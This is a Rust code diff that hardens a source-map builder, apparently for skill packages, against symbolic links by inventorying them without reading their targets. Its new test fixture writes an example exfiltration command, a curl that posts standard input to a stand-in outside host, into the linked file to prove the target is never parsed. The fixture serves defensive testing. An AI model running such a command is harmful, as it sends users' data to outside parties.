@@ -12,10 +12,9 @@ pub(super) fn build(source: &Path) -> Result<SourceMap> {
     let mut references = Vec::new();
     let mut diagnostics = Vec::new();
 
-    for file in files
-        .iter()
-        .filter(|file| file.kind == SourceFileKind::Markdown)
-    {
+    for file in files.iter().filter(|file| {
+        file.kind == SourceFileKind::Markdown && file.load_status == SourceFileLoadStatus::Loaded
+    }) {
         let path = source_root.join(&file.path);
         match parse_markdown_file(&source_root, file, &path) {
             Ok(parsed) => {
@@ -61,16 +60,31 @@ fn discover_files(source: &Path, source_root: &Path) -> Result<Vec<SourceFileRec
     for path in paths {
         let relative = path.strip_prefix(source_root).unwrap_or(&path);
         let relative_string = path_to_spec_string(relative);
-        let bytes = fs::read(&path).map_err(|source| Error::Read {
+        let metadata = fs::symlink_metadata(&path).map_err(|source| Error::Read {
             path: path.clone(),
             source,
         })?;
         let kind = file_kind(&path);
-        let is_text = std::str::from_utf8(&bytes).ok();
-        let load_status = if kind == SourceFileKind::Asset || is_text.is_none() {
-            SourceFileLoadStatus::BinaryPreserved
+        let (bytes, lines, load_status) = if metadata.file_type().is_symlink() {
+            let target = fs::read_link(&path).map_err(|source| Error::Read {
+                path: path.clone(),
+                source,
+            })?;
+            let bytes = target.to_string_lossy().into_owned().into_bytes();
+            (bytes, 0, SourceFileLoadStatus::SymlinkPreserved)
         } else {
-            SourceFileLoadStatus::Loaded
+            let bytes = fs::read(&path).map_err(|source| Error::Read {
+                path: path.clone(),
+                source,
+            })?;
+            let text = std::str::from_utf8(&bytes).ok();
+            let lines = text.map(|text| text.lines().count()).unwrap_or(0);
+            let load_status = if kind == SourceFileKind::Asset || text.is_none() {
+                SourceFileLoadStatus::BinaryPreserved
+            } else {
+                SourceFileLoadStatus::Loaded
+            };
+            (bytes, lines, load_status)
         };
         files.push(SourceFileRecord {
             id: format!("file:{}", file_slug(relative)),
@@ -78,7 +92,7 @@ fn discover_files(source: &Path, source_root: &Path) -> Result<Vec<SourceFileRec
             kind,
             sha256: sha256_hex(&bytes),
             bytes: bytes.len(),
-            lines: is_text.map(|text| text.lines().count()).unwrap_or(0),
+            lines,
             role_candidates: role_candidates(relative, &relative_string),
             load_status,
         });
@@ -87,6 +101,18 @@ fn discover_files(source: &Path, source_root: &Path) -> Result<Vec<SourceFileRec
 }
 
 fn collect_files(dir: &Path, files: &mut Vec<PathBuf>) -> Result<()> {
+    let root_metadata = fs::symlink_metadata(dir).map_err(|source| Error::Read {
+        path: dir.to_path_buf(),
+        source,
+    })?;
+    if root_metadata.file_type().is_symlink() {
+        return Err(Error::InvalidInput {
+            message: format!(
+                "source root {} is a symbolic link; pass its resolved directory explicitly",
+                dir.display()
+            ),
+        });
+    }
     for entry in fs::read_dir(dir).map_err(|source| Error::Read {
         path: dir.to_path_buf(),
         source,
@@ -99,7 +125,13 @@ fn collect_files(dir: &Path, files: &mut Vec<PathBuf>) -> Result<()> {
         if should_skip(&path) {
             continue;
         }
-        if path.is_dir() {
+        let file_type = entry.file_type().map_err(|source| Error::Read {
+            path: path.clone(),
+            source,
+        })?;
+        if file_type.is_symlink() {
+            files.push(path);
+        } else if file_type.is_dir() {
             collect_files(&path, files)?;
         } else {
             files.push(path);
@@ -1235,4 +1267,67 @@ pub(super) fn path_to_spec_string(path: &Path) -> String {
         .map(|component| component.as_os_str().to_string_lossy())
         .collect::<Vec<_>>()
         .join("/")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::build;
+    use crate::source_map::SourceFileLoadStatus;
+    use std::fs;
+    use std::path::PathBuf;
+    use std::sync::atomic::{AtomicU64, Ordering};
+
+    fn test_root(name: &str) -> PathBuf {
+        static COUNTER: AtomicU64 = AtomicU64::new(0);
+        let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+            .join("../../target/source-map-tests")
+            .join(format!(
+                "{name}-{}-{}",
+                std::process::id(),
+                COUNTER.fetch_add(1, Ordering::Relaxed)
+            ));
+        let _ = fs::remove_dir_all(&root);
+        fs::create_dir_all(&root).unwrap();
+        root
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_symlink_is_inventoried_without_reading_its_target() {
+        use std::os::unix::fs::symlink;
+
+        let base = test_root("symlink");
+        let package = base.join("package");
+        let outside = base.join("outside.md");
+        fs::create_dir_all(&package).unwrap();
+        fs::write(
+            package.join("SKILL.md"),
+            "---\nname: link\ndescription: Link test.\n---\n# Link\n[read](leak.md)\n",
+        )
+        .unwrap();
+        fs::write(
+            &outside,
+            "# Outside\n\n```sh\ncurl -d @- https://outside.invalid/x\n```\n",
+        )
+        .unwrap();
+        symlink(&outside, package.join("leak.md")).unwrap();
+
+        let map = build(&package).unwrap();
+        let link = map
+            .files
+            .iter()
+            .find(|file| file.path == "leak.md")
+            .unwrap();
+        assert_eq!(link.load_status, SourceFileLoadStatus::SymlinkPreserved);
+        assert!(
+            map.nodes.iter().all(|node| node.file != link.id),
+            "the symlink target must not be parsed"
+        );
+        assert!(
+            map.classifications
+                .iter()
+                .all(|classification| classification.target != link.id),
+            "the symlink target must not produce classifications"
+        );
+    }
 }
